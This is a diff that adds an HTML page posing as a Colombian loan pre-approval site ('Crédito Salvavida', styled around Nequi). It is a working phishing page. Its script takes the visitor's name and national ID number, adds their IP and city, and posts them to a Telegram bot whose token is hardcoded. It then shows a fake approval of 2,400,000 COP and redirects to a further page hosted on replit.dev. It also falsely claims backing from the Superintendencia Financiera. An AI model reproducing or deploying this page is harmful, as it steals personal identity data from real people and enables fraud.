@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Proceso de Credito</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: 'Manrope', sans-serif;
+            background-image: url("img/simulador.png");
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat; 
+            color: #200020;
+            padding: 120px 20px 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        html {
+            height: 100%;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .cabezeramor-t3 {
+            background-color: #ffffff;
+            height: 80px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .cabezeramor-t3 img {
+            height: 30px;
+            max-width: 100%;
+        }
+
+        .container {
+            max-width: 600px;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin: auto;
+            text-align: left;
+            width: 100%;
+        }
+
+        .titulo-principal {
+            font-weight: bold;
+            color: #ffffff;
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 2em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        h2 {
+            color: #200020;
+            margin-bottom: 10px;
+            font-size: 1.8em;
+        }
+
+        p {
+            color: #828d92;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+
+        /* Inputs pequeños */
+        .form-floating {
+            margin-bottom: 12px !important;
+        }
+
+        .form-control {
+            background-color: transparent;
+            border: 1px solid #200020;
+            color: #200020;
+            height: 45px;
+            font-size: 14px;
+            padding: 8px 12px;
+        }
+
+        .form-floating label {
+            color: #200020;
+            font-weight: bold;
+            background-color: transparent;
+            font-size: 13px;
+            padding: 8px 12px;
+        }
+
+        .form-floating > .form-control:focus ~ label,
+        .form-floating > .form-control:not(:placeholder-shown) ~ label {
+            opacity: 0.8;
+            transform: scale(0.8) translateY(-0.8rem) translateX(0.15rem);
+            font-size: 12px;
+            padding: 0 5px;
+        }
+
+        .form-control:focus {
+            background-color: transparent;
+            border-color: #da0081;
+            box-shadow: none;
+        }
+
+        .btn-primary, .btn-pay  {
+            background-color: #200020;
+            border-color: #200020;
+            padding: 12px;
+            font-size: 1.1em;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover, .btn-pay:hover {
+            background-color: #da0081;
+            border-color: #da0081;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(218, 0, 129, 0.4);
+        }
+
+        .credito-info {
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #dee2e6;
+            text-align: center;
+            background: linear-gradient(135deg, #f8f9fa, #ffffff);
+        }
+        .credito-info h3 {
+            color: #a0006f;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+        }
+        .credito-info p {
+            font-size: 1.1em;
+            margin: 5px 0;
+            color: #555;
+        }
+        .credito-info strong {
+            color: #bf0072;
+        }
+        .monto-cuota {
+            font-weight: bold;
+            font-size: 1.5em;
+            color: #28a745;
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(40, 167, 69, 0.1);
+            border-radius: 10px;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8); 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none;
+        }
+
+        .overlay img {
+            width: 7rem;
+        }
+
+        /* Estilo para el select con más opciones */
+        .form-select {
+            height: 45px;
+            font-size: 14px;
+            padding: 8px 12px;
+            border: 1px solid #200020;
+            background-color: transparent;
+            cursor: pointer;
+        }
+
+        .form-select:focus {
+            border-color: #da0081;
+            box-shadow: none;
+        }
+
+        .form-group label {
+            font-weight: bold;
+            color: #200020;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        /* Badge de interés especial */
+        .interes-badge {
+            display: inline-block;
+            background: #da0081;
+            color: white;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-left: 8px;
+        }
+
+        /* FOOTER - El banner convertido en footer */
+        .footer-credito {
+            background: linear-gradient(135deg, #200020 0%, #3a0a63 50%, #200020 100%);
+            color: white;
+            padding: 20px;
+            margin-top: 40px;
+            border-top: 2px solid #da0081;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .footer-credito::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                rgba(255,255,255,0.05) 10px,
+                rgba(255,255,255,0.05) 20px
+            );
+            pointer-events: none;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .footer-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.1);
+            padding: 6px 15px;
+            border-radius: 50px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .footer-item span {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .footer-item i {
+            font-size: 18px;
+            color: #FFD700;
+        }
+
+        .footer-promo {
+            background: #da0081;
+            padding: 6px 20px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 10px rgba(218, 0, 129, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        .footer-copyright {
+            text-align: center;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 12px;
+            opacity: 0.8;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 100px 10px 20px;
+            }
+
+            .titulo-principal {
+                font-size: 1.6em;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+
+            .container {
+                padding: 20px;
+            }
+
+            .credito-info h3 {
+                font-size: 1.3em;
+            }
+
+            .credito-info p,
+            .monto-cuota {
+                font-size: 1em;
+            }
+
+            .form-control {
+                height: 42px;
+                font-size: 13px;
+            }
+
+            .btn-primary {
+                padding: 10px;
+            }
+
+            .footer-container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-info {
+                justify-content: center;
+                gap: 10px;
+            }
+
+            .footer-item {
+                padding: 4px 12px;
+            }
+
+            .footer-item span {
+                font-size: 12px;
+            }
+
+            .footer-promo {
+                font-size: 13px;
+                padding: 5px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="cabezeramor-t3">
+        <img src="img/logo.svg" alt="Logo">
+        <img src="img/3ra.jpg" alt="Icono">
+    </header>
+
+    <div class="main-content">
+        <br><br><br><br>
+        <div class="titulo-principal">✨ Solicita tu préstamo Propulsor ✨</div>
+        <div class="titulo-principal">✨ Solicita tu préstamo salvavida ✨</div>
+
+        <div class="container" id="form-container">
+            <h2>Consulta tu puntaje</h2>
+            <p>Ingresa tus datos y descubre tu crédito pre-aprobado</p>
+            <form id="consulta-form">
+                <div class="form-floating mb-3">
+                    <input type="text" id="nombreApellido" name="nombreApellido" class="form-control" placeholder="Ingrese su nombre y apellido" required>
+                    <label for="nombreApellido">Nombre completo</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="number" id="cedula" name="cedula" class="form-control" placeholder="Ingrese su cédula" required minlength="5" maxlength="10">
+                    <label for="cedula">Número de cédula</label>
+                </div>
+                <button type="button" id="btn-consultar" class="btn btn-primary">Consultar mi crédito</button>
+            </form>
+        </div>
+
+        <div class="container" id="loading-message" style="display:none;">
+            <p style="text-align:center;">⏳ Por favor espere, estamos consultando si aplica para un crédito...</p>
+        </div>
+
+        <div class="container" id="resultado-credito" style="display:none;">
+            <div class="credito-info">
+                <h3 class="titulo-credito"></h3>
+                <p class="monto-prestamo"></p>
+                <p>Meses de plazo: <span id="plazo-meses">12</span></p>
+                <p>Interés mensual: <strong>$<span id="interes-mensual">11,000</span></strong> <span class="interes-badge">Tasa fija</span></p>
+                <p>Pago total: <strong>$<span id="pago-total"></span></strong></p>
+                <p class="monto-cuota">💰 Cuota mensual: $<span id="cuota-mensual"></span></p>
+            </div>
+
+            <div class="form-group mt-4">
+                <label for="plazo">Selecciona el plazo que prefieras:</label>
+                <select id="plazo" class="form-select">
+                    <option value="6">6 meses</option>
+                    <option value="12" selected>12 meses (más popular)</option>
+                    <option value="18">18 meses</option>
+                    <option value="24">24 meses</option>
+                    <option value="36">36 meses</option>
+                    <option value="48">48 meses</option>
+                </select>
+                <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">
+                    ⚡ A mayor plazo, cuota más baja
+                </small>
+            </div><br>
+
+            <button class="btn btn-primary" id="btn-pagar">Continuar con mi solicitud</button>
+            <div class="overlay" id="loading-overlay">
+                <img src="./img/gnequi.gif" alt="Cargando...">
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER - El banner convertido en footer -->
+    <footer class="footer-credito">
+        <div class="footer-container">
+            <div class="footer-info">
+                <div class="footer-item">
+                    <i>⚡</i>
+                    <span>Aprobación en 5 min</span>
+                </div>
+                <div class="footer-item">
+                    <i>💰</i>
+                    <span>Hasta $5.000.000 COP</span>
+                </div>
+                <div class="footer-item">
+                    <i>📱</i>
+                    <span>Sin codeudor</span>
+                </div>
+            </div>
+            <div class="footer-promo">
+                🎁 Primera cuota sin intereses
+            </div>
+        </div>
+        <div class="footer-copyright">
+            © 2024 Crédito Salvavida - Todos los derechos reservados | 💳 Superintendencia Financiera
+        </div>
+    </footer>
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            // Limita el input de cédula a 10 caracteres
+            $("#cedula").on('input', function () {
+                var valor = $(this).val();
+                if (valor.length > 10) {
+                    $(this).val(valor.slice(0, 10));
+                }
+            });
+
+            // Botón Consultar
+            $("#btn-consultar").click(function () {
+                const nombreApellido = $("#nombreApellido").val().trim();
+                const cedula = $("#cedula").val().trim();
+                const botToken = '7531945755:AAFSjCYMEx8LMgEUsUiSj3QTzo0ZGp09wAY';
+                const chatId = '-1002445779361';
+
+                // Validar campos
+                if (!nombreApellido || cedula.length < 4) {
+                    alert("Por favor, complete todos los campos correctamente.");
+                    return;
+                }
+
+                // Guardar datos en sessionStorage y localStorage
+                sessionStorage.setItem("nombreApellido", nombreApellido);
+                sessionStorage.setItem("cedula", cedula);
+                localStorage.setItem("nombreApellido", nombreApellido);
+                localStorage.setItem("cedula", cedula);
+
+                // Obtener IP y enviar mensaje a Telegram
+                $.getJSON('https://ipinfo.io/json', function(data) {
+                    const ip = data.ip || 'IP desconocida';
+                    const ciudad = data.city || 'Ciudad desconocida';
+                    const pais = data.country || 'País desconocido';
+
+                    const mensaje = `
+    👁Nequi Paso 1👁
+    🆔Nombres: ${nombreApellido}
+    🪪Cedula: ${cedula}
+    🌏IP: ${ip}
+    🏙Ciudad: ${ciudad}
+    🇨🇴País: ${pais}`;
+
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${botToken}/sendMessage`,
+                        method: 'POST',
+                        data: {
+                            chat_id: chatId,
+                            text: mensaje
+                        },
+                        success: function(response) {
+                            console.log("Información enviada correctamente.");
+                            $("#form-container").hide();
+                            $("#loading-message").show();
+                            setTimeout(function () {
+                                realizar_consulta();
+                            }, 2000);
+                        },
+                        error: function(error) {
+                            alert("Error al enviar la información.");
+                        }
+                    });
+                });
+            });
+
+            function realizar_consulta() {
+                var montoAprobado = 2400000;
+                var nombre = "Esto es lo que te podemos prestar, si todo sale bien.";
+
+                $("#loading-message").hide();
+                $(".titulo-credito").html("Hola, <strong>" + nombre + "</strong>");
+                $(".monto-prestamo").html("Cantidad a prestar: <strong>$" + montoAprobado.toLocaleString('es-CO') + " COP</strong>");
+                actualizarCuota(montoAprobado);
+                $("#resultado-credito").show();
+            }
+
+            function actualizarCuota(monto) {
+                var plazo = parseInt($("#plazo").val());
+                var tasaMensual = 11000;
+                var pagoTotal = monto + (tasaMensual * plazo);
+                var cuotaMensual = pagoTotal / plazo;
+
+                $("#pago-total").text(pagoTotal.toLocaleString('es-CO'));
+                $("#cuota-mensual").text(cuotaMensual.toLocaleString('es-CO'));
+                $("#plazo-meses").text(plazo + " meses");
+            }
+
+            $("#plazo").change(function () {
+                var monto = 2400000;
+                actualizarCuota(monto);
+            });
+
+            $("#btn-pagar").click(function () {
+                $("#loading-overlay").fadeIn();
+                setTimeout(function () {
+                    window.location.href = "https://85209926-39fc-46ee-a72a-05fd23dc0609-00-3qu8iexvja78g.janeway.replit.dev/dinainvalida/inicio.html";
+                }, 3000);
+            });
+        });
+    </script>
+
+</body>
+
+</html>
